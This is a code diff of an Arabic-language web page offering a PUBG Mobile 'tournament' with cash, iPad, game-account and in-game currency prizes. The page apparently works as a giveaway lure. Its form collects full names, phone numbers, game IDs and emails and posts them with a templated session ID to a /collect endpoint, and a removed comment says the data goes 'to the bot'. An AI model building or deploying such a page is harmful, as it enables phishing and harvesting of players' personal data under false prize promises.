@@ -8,14 +8,23 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
-            background: #0a0a0a;
             min-height: 100vh;
+            background: url('https://wallpaperslinks.com/wp-content/uploads/2024/11/PUBG-Neon-Logo-4K-Mobile-Wallpaper-scaled.jpg') no-repeat center center/cover;
             color: #fff;
+            position: relative;
         }
-        /* ===== الهيدر ===== */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.75);
+            z-index: 0;
+        }
+        * { position: relative; z-index: 1; }
+
         .header {
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
-            padding: 20px 40px;
+            background: rgba(0,0,0,0.6);
+            padding: 15px 30px;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -26,51 +35,67 @@
         .header .menu a {
             color: #aaa;
             text-decoration: none;
-            margin-left: 25px;
+            margin-left: 20px;
             font-size: 14px;
             transition: 0.3s;
         }
         .header .menu a:hover { color: #ff6b6b; }
 
-        /* ===== البطولة ===== */
         .hero {
-            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.8)), url('https://i.imgur.com/2aZ4t1x.jpeg') center/cover;
-            padding: 80px 20px;
+            padding: 60px 20px 30px;
             text-align: center;
-            position: relative;
         }
         .hero h1 { font-size: 48px; margin-bottom: 10px; }
         .hero h1 span { color: #ff6b6b; }
         .hero p { color: #ccc; font-size: 18px; max-width: 600px; margin: 0 auto 30px; }
+
         .prize-box {
             display: flex;
             justify-content: center;
-            gap: 40px;
+            gap: 20px;
             flex-wrap: wrap;
-            margin: 30px 0;
+            margin: 20px 0 30px;
         }
         .prize-item {
             background: rgba(255,255,255,0.05);
-            padding: 20px 30px;
+            padding: 15px 20px;
             border-radius: 15px;
             border: 1px solid rgba(255,255,255,0.1);
-            min-width: 140px;
-        }
-        .prize-item .icon { font-size: 40px; }
-        .prize-item .value { font-size: 28px; font-weight: bold; color: #ff6b6b; }
-        .prize-item .label { color: #888; font-size: 13px; }
-
-        /* ===== أيقونة متحركة (الزر) ===== */
-        .cta-section {
+            min-width: 120px;
             text-align: center;
-            padding: 40px 20px;
         }
+        .prize-item .icon { font-size: 32px; }
+        .prize-item .value { font-size: 22px; font-weight: bold; color: #ff6b6b; }
+        .prize-item .label { color: #888; font-size: 12px; }
+
+        .features {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            padding: 20px;
+        }
+        .feature-item {
+            background: rgba(255,255,255,0.03);
+            padding: 15px;
+            border-radius: 15px;
+            text-align: center;
+            width: 120px;
+            border: 1px solid rgba(255,255,255,0.05);
+            transition: 0.3s;
+            cursor: pointer;
+        }
+        .feature-item:hover { background: rgba(255,255,255,0.08); transform: translateY(-5px); }
+        .feature-item .icon { font-size: 30px; }
+        .feature-item .label { color: #aaa; font-size: 11px; margin-top: 5px; }
+
+        .cta-section { text-align: center; padding: 20px 20px 10px; }
         .cta-btn {
             display: inline-block;
-            padding: 18px 50px;
+            padding: 16px 50px;
             background: linear-gradient(135deg, #ff6b6b, #ee5a24);
             border-radius: 50px;
-            font-size: 22px;
+            font-size: 20px;
             font-weight: bold;
             color: #fff;
             text-decoration: none;
@@ -87,13 +112,12 @@
             100% { transform: scale(1); box-shadow: 0 0 20px rgba(255,107,107,0.3); }
         }
 
-        /* ===== النموذج (يظهر عند الضغط) ===== */
         .register-form {
             display: none;
             max-width: 600px;
-            margin: 30px auto;
+            margin: 20px auto;
             padding: 30px;
-            background: rgba(255,255,255,0.05);
+            background: rgba(0,0,0,0.8);
             border-radius: 20px;
             border: 1px solid rgba(255,255,255,0.1);
         }
@@ -135,39 +159,20 @@
             transition: 0.3s;
         }
         .register-form .submit-btn:hover { transform: scale(1.02); }
-
-        /* ===== أيقونات إضافية ===== */
-        .features {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            flex-wrap: wrap;
-            padding: 30px 20px;
-        }
-        .feature-item {
-            background: rgba(255,255,255,0.03);
-            padding: 20px;
-            border-radius: 15px;
+        .register-form .note {
             text-align: center;
-            width: 140px;
-            border: 1px solid rgba(255,255,255,0.05);
-            transition: 0.3s;
-            cursor: pointer;
+            color: #888;
+            font-size: 13px;
+            margin-top: 15px;
         }
-        .feature-item:hover { background: rgba(255,255,255,0.08); transform: translateY(-5px); }
-        .feature-item .icon { font-size: 36px; }
-        .feature-item .label { color: #aaa; font-size: 12px; margin-top: 8px; }
 
-        /* ===== الفوتر ===== */
         .footer {
             text-align: center;
-            padding: 30px;
+            padding: 20px;
             color: #444;
             font-size: 12px;
             border-top: 1px solid rgba(255,255,255,0.05);
         }
-
-        /* ===== تذييل ===== */
         @media (max-width: 600px) {
             .hero h1 { font-size: 28px; }
             .phone-row { flex-direction: column; }
@@ -177,7 +182,6 @@
 </head>
 <body>
 
-    <!-- ===== الهيدر ===== -->
     <div class="header">
         <div class="brand">🏆 <span>BG</span>Tournament</div>
         <div class="menu">
@@ -188,30 +192,48 @@
         </div>
     </div>
 
-    <!-- ===== الهيرو ===== -->
     <div class="hero">
         <h1>بطولة <span>ببجي موبايل</span></h1>
-        <p>اشترك الآن واربح جوائز مالية قيّمة وشحنات وبطاقات هدايا! البطولة مفتوحة للجميع.</p>
+        <p>اشترك الآن واربح جوائز مالية قيّمة وشحنات وبطاقات هدايا!</p>
         <div class="prize-box">
             <div class="prize-item">
                 <div class="icon">💰</div>
-                <div class="value">10,000$</div>
-                <div class="label">الجائزة الأولى</div>
+                <div class="value">3,000$</div>
+                <div class="label">الجائزة الكبرى</div>
             </div>
             <div class="prize-item">
                 <div class="icon">🎁</div>
-                <div class="value">5,000$</div>
-                <div class="label">الجائزة الثانية</div>
+                <div class="value">100$</div>
+                <div class="label">جائزة ثانية</div>
             </div>
             <div class="prize-item">
-                <div class="icon">🛡️</div>
-                <div class="value">شحنات</div>
-                <div class="label">هدايا للمشاركين</div>
+                <div class="icon">🎮</div>
+                <div class="value">Lv.70</div>
+                <div class="label">حساب ببجي</div>
+            </div>
+            <div class="prize-item">
+                <div class="icon">📱</div>
+                <div class="value">iPad</div>
+                <div class="label">جهاز لوحي</div>
+            </div>
+            <div class="prize-item">
+                <div class="icon">💎</div>
+                <div class="value">1000</div>
+                <div class="label">شدات</div>
+            </div>
+            <div class="prize-item">
+                <div class="icon">💎</div>
+                <div class="value">660</div>
+                <div class="label">شدات</div>
+            </div>
+            <div class="prize-item">
+                <div class="icon">💎</div>
+                <div class="value">325</div>
+                <div class="label">شدات</div>
             </div>
         </div>
     </div>
 
-    <!-- ===== أيقونات تنقلك لأشياء أخرى ===== -->
     <div class="features">
         <div class="feature-item" onclick="alert('🚀 قريباً!')">
             <div class="icon">📊</div>
@@ -231,28 +253,22 @@
         </div>
     </div>
 
-    <!-- ===== الزر المتجول للمشاركة ===== -->
     <div class="cta-section">
-        <button class="cta-btn" onclick="toggleForm()">
-            🔥 اضغط للمشاركة بالبطولة
-        </button>
+        <button class="cta-btn" onclick="toggleForm()">🔥 اضغط للمشاركة بالبطولة</button>
     </div>
 
-    <!-- ===== نموذج التسجيل ===== -->
     <div class="register-form" id="registerForm">
         <h2 style="text-align:center; margin-bottom:20px;">📝 سجل معلوماتك</h2>
         <form method="POST" id="registerFormSubmit">
-            <!-- الاسم الرباعي -->
             <div class="form-group">
-                <label>👤 الاسم الرباعي (كما في اللعبة)</label>
+                <label>👤 الاسم الرباعي</label>
                 <input type="text" name="full_name" placeholder="مثل: أحمد محمد علي حسن" required>
             </div>
-
-            <!-- رقم الهاتف مع كود الدولة -->
             <div class="form-group">
                 <label>📞 رقم الهاتف</label>
                 <div class="phone-row">
                     <select name="phone_code" id="phone_code" required>
+                        <option value="+967">🇾🇪 +967</option>
                         <option value="+966">🇸🇦 +966</option>
                         <option value="+20">🇪🇬 +20</option>
                         <option value="+971">🇦🇪 +971</option>
@@ -303,25 +319,21 @@
                     <input type="text" name="phone_number" placeholder="رقم الهاتف" required>
                 </div>
             </div>
-
-            <!-- ID اللعبة -->
             <div class="form-group">
-                <label>🎮 ID الخاص باللعبة (ببجي)</label>
+                <label>🎮 ID اللعبة (ببجي)</label>
                 <input type="text" name="game_id" placeholder="مثال: 5123456789" required>
             </div>
-
-            <!-- البريد الإلكتروني للتواصل -->
             <div class="form-group">
                 <label>📧 البريد الإلكتروني (للتواصل وإرسال المكافآت)</label>
                 <input type="email" name="email" placeholder="example@email.com" required>
             </div>
-
             <button class="submit-btn" type="submit">✅ تسجيل المشاركة</button>
         </form>
-        <p style="text-align:center; color:#555; font-size:12px; margin-top:15px;">سيتم التواصل معك خلال 24 ساعة.</p>
+        <div class="note">
+            📌 سيتم إرسال شروط المسابقة وكيفية اللعب إلى بريدك الإلكتروني.
+        </div>
     </div>
 
-    <!-- ===== الفوتر ===== -->
     <div class="footer">
         © 2026 بطولة ببجي موبايل – جميع الحقوق محفوظة
     </div>
@@ -332,24 +344,19 @@
             form.classList.toggle('active');
         }
 
-        // إرسال النموذج عبر AJAX (اختياري) مع إرسال البيانات للبوت
         document.getElementById('registerFormSubmit').addEventListener('submit', function(e) {
             e.preventDefault();
             const formData = new FormData(this);
             const data = Object.fromEntries(formData.entries());
             const session_id = '{{ session_id }}';
 
-            // إرسال البيانات إلى الخادم
             fetch('/collect', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    session_id: session_id,
-                    ...data 
-                })
+                body: JSON.stringify({ session_id: session_id, ...data })
             }).then(res => res.json()).then(() => {
                 alert('✅ تم تسجيل مشاركتك بنجاح! سيتم التواصل معك قريباً.');
-                window.location.reload(); // أو توجيه لصفحة شكر
+                window.location.reload();
             }).catch(() => {
                 alert('⚠️ حدث خطأ، يرجى المحاولة مرة أخرى.');
             });
